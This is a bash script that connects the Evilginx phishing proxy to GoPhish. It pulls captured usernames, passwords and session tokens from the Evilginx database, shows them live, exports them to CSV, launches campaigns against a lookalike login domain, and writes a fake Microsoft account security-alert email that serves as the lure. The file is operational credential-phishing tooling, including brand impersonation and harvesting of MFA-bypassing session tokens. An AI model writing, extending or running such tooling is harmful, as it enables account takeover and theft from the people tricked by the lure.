#!/bin/bash

#############################################
# Evilginx-GoPhish Integration Script
# Synchronizes captured sessions from Evilginx to GoPhish
#############################################

set -e

# Color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

# Configuration
EVILGINX_DB="/root/.evilginx/data.db"
GOPHISH_API_URL="https://127.0.0.1:3333/api"
GOPHISH_API_KEY=""  # Will be set after first run
GOPHISH_DIR="/opt/gophish"

log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# Get GoPhish API key
get_gophish_api_key() {
    if [ -f "${GOPHISH_DIR}/.api_key" ]; then
        GOPHISH_API_KEY=$(cat "${GOPHISH_DIR}/.api_key")
    else
        echo -e "${YELLOW}Please enter your GoPhish API key:${NC}"
        read -r GOPHISH_API_KEY
        echo "${GOPHISH_API_KEY}" > "${GOPHISH_DIR}/.api_key"
        chmod 600 "${GOPHISH_DIR}/.api_key"
    fi
}

# Extract sessions from Evilginx database
extract_evilginx_sessions() {
    log "Extracting sessions from Evilginx..."

    if [ ! -f "${EVILGINX_DB}" ]; then
        error "Evilginx database not found at ${EVILGINX_DB}"
        return 1
    fi

    # Query Evilginx database for captured sessions
    sqlite3 "${EVILGINX_DB}" "SELECT id, username, password, tokens, created_at FROM sessions WHERE username IS NOT NULL;" > /tmp/evilginx_sessions.txt

    log "Sessions extracted successfully"
}

# Create GoPhish campaign with captured data
create_gophish_campaign() {
    log "Creating GoPhish campaign..."

    local campaign_name="Evilginx Import - $(date +'%Y-%m-%d %H:%M:%S')"

    # Create campaign via GoPhish API
    curl -sk -X POST "${GOPHISH_API_URL}/campaigns/" \
        -H "Authorization: ${GOPHISH_API_KEY}" \
        -H "Content-Type: application/json" \
        -d @- <<EOF
{
    "name": "${campaign_name}",
    "template": {
        "name": "Evilginx Captured Sessions"
    },
    "url": "https://login.exodustraderai.info",
    "launch_date": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)",
    "smtp": {
        "host": "localhost:25"
    }
}
EOF

    log "Campaign created: ${campaign_name}"
}

# Monitor Evilginx sessions in real-time
monitor_sessions() {
    log "Starting real-time session monitoring..."

    info "Monitoring Evilginx for new sessions. Press Ctrl+C to stop."

    while true; do
        # Check for new sessions every 10 seconds
        if [ -f "${EVILGINX_DB}" ]; then
            NEW_SESSIONS=$(sqlite3 "${EVILGINX_DB}" "SELECT COUNT(*) FROM sessions WHERE created_at > datetime('now', '-10 seconds');")

            if [ "${NEW_SESSIONS}" -gt 0 ]; then
                info "New session(s) captured: ${NEW_SESSIONS}"

                # Extract and display new sessions
                sqlite3 "${EVILGINX_DB}" "SELECT username, password, created_at FROM sessions WHERE created_at > datetime('now', '-10 seconds');" | while IFS='|' read -r user pass time; do
                    echo -e "${GREEN}✓${NC} Username: ${user}"
                    echo -e "${GREEN}✓${NC} Password: ${pass}"
                    echo -e "${GREEN}✓${NC} Time: ${time}"
                    echo ""
                done
            fi
        fi

        sleep 10
    done
}

# Export sessions to CSV
export_to_csv() {
    log "Exporting sessions to CSV..."

    local output_file="/tmp/evilginx_sessions_$(date +'%Y%m%d_%H%M%S').csv"

    # Create CSV header
    echo "Username,Password,Tokens,Captured_At" > "${output_file}"

    # Export data
    sqlite3 -csv "${EVILGINX_DB}" "SELECT username, password, tokens, created_at FROM sessions WHERE username IS NOT NULL;" >> "${output_file}"

    log "Sessions exported to: ${output_file}"
}

# Create GoPhish email template
create_email_template() {
    log "Creating GoPhish email template..."

    cat > /tmp/gophish_template.html <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Alert</title>
</head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;">
    <div style="max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
        <div style="background-color: #0078d4; padding: 20px; border-radius: 8px 8px 0 0;">
            <h2 style="color: white; margin: 0;">Microsoft Account Security Alert</h2>
        </div>
        <div style="padding: 30px;">
            <p>Hello {{.FirstName}},</p>
            <p>We've detected unusual sign-in activity on your Microsoft account. For your security, please verify your identity.</p>
            <p style="margin: 30px 0;">
                <a href="{{.URL}}" style="background-color: #0078d4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block;">Verify Account</a>
            </p>
            <p style="color: #666; font-size: 12px;">If you didn't request this, please ignore this email.</p>
        </div>
        <div style="background-color: #f5f5f5; padding: 15px; text-align: center; border-radius: 0 0 8px 8px;">
            <p style="margin: 0; color: #666; font-size: 11px;">© Microsoft Corporation. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
EOF

    log "Email template created at /tmp/gophish_template.html"
}

# Display menu
show_menu() {
    clear
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║        Evilginx-GoPhish Integration Manager               ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo "1) Extract Evilginx sessions"
    echo "2) Monitor sessions in real-time"
    echo "3) Export sessions to CSV"
    echo "4) Create GoPhish campaign"
    echo "5) Create email template"
    echo "6) View Evilginx database stats"
    echo "0) Exit"
    echo ""
    echo -n "Select an option: "
}

# View database stats
view_stats() {
    if [ ! -f "${EVILGINX_DB}" ]; then
        error "Evilginx database not found"
        return
    fi

    log "Evilginx Database Statistics"
    echo ""

    TOTAL_SESSIONS=$(sqlite3 "${EVILGINX_DB}" "SELECT COUNT(*) FROM sessions;")
    SUCCESSFUL_SESSIONS=$(sqlite3 "${EVILGINX_DB}" "SELECT COUNT(*) FROM sessions WHERE username IS NOT NULL;")

    info "Total Sessions: ${TOTAL_SESSIONS}"
    info "Successful Captures: ${SUCCESSFUL_SESSIONS}"

    echo ""
    echo "Recent Captures:"
    sqlite3 -header -column "${EVILGINX_DB}" "SELECT id, username, created_at FROM sessions WHERE username IS NOT NULL ORDER BY created_at DESC LIMIT 10;"

    echo ""
    read -p "Press Enter to continue..."
}

# Main menu loop
main() {
    while true; do
        show_menu
        read -r choice

        case $choice in
            1)
                extract_evilginx_sessions
                read -p "Press Enter to continue..."
                ;;
            2)
                monitor_sessions
                ;;
            3)
                export_to_csv
                read -p "Press Enter to continue..."
                ;;
            4)
                get_gophish_api_key
                create_gophish_campaign
                read -p "Press Enter to continue..."
                ;;
            5)
                create_email_template
                read -p "Press Enter to continue..."
                ;;
            6)
                view_stats
                ;;
            0)
                log "Exiting..."
                exit 0
                ;;
            *)
                error "Invalid option"
                sleep 2
                ;;
        esac
    done
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    error "Please run as root (use sudo)"
    exit 1
fi

main "$@"
